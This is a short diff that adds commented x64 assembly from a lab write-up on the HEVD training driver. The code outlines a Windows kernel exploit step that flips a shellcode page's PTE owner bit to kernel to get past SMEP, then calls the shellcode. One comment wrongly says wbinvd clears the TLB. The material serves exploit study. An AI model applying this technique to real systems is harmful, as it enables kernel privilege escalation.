@@ -1,0 +1,15 @@
+source: https://kristal-g.github.io/2021/02/07/HEVD_StackOverflowGS_Windows_10_RS5_x64.html
+
+pop rcx                 ; rcx = shellcode address
+call MiGetPteAddress    
+mov r8, rax             ; rax = r8 = Shellcode's PTE address
+mov rdx, r8             ; rdx = Shellcode's PTE address
+mov rax, [rax]          ; rax = Shellcode's PTE value
+mov r8, rax             ; r8 = Shellcode's PTE value
+mov rcx, r8             ; rcx = Shellcode's PTE value
+mov rax, 4              
+sub rcx, rax            ; The Owner flag is the 3rd bit. It was 1 (Owner=Usermode) so by subtracting 4 from it we clear that bit and make it Owner=Kernel
+mov rax, rcx            ; rax = modified PTE value
+mov [rdx], rax          ; save the modified PTE value back into the PTE address
+wbinvd                  ; Clear the TLB Cache
+call shellcode 
